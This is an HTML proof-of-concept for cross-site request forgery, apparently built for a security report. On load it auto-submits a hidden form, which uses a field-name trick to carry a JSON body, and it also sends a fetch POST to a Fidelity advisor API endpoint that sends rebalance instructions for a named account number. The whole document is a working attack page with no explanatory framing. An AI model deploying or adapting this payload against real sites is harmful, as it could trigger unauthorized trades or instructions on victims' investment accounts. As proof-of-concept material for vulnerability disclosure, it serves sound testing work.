<html>
  <body onload="submitForm()">
    <form id="csrf" action="https://fin-wealthcentral-advisorchannel.fmr.com/ssc/mars/wc/channel/api/v1/rebalances/workplace/send-instructions" method="POST" enctype="application/json">
      <input type="hidden" name='{"targetType":"Account","selectedAccounts":[{"accountNumber":"34850352705204","custodian":"FID","accountSource":"FPRS"}],"newRequest":true,"fsake":"' value='"}'>
    </form>

    <script>
      function submitForm() {
        var formData = new FormData(document.getElementById("csrf"));

        // Construct the fetch options
        var fetchOptions = {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Your-Custom-Header': 'Header-Value'
          },
          body: formData
        };

        // Make the fetch request
        fetch("https://fin-wealthcentral-advisorchannel.fmr.com/ssc/mars/wc/channel/api/v1/rebalances/workplace/send-instructions", fetchOptions)
          .then(response => response.json())
          .then(data => {
            // Handle the response data if needed
            console.log(data);
          })
          .catch(error => {
            // Handle errors here
            console.error('Error:', error);
          });
      }
    </script>
  </body>
</html>



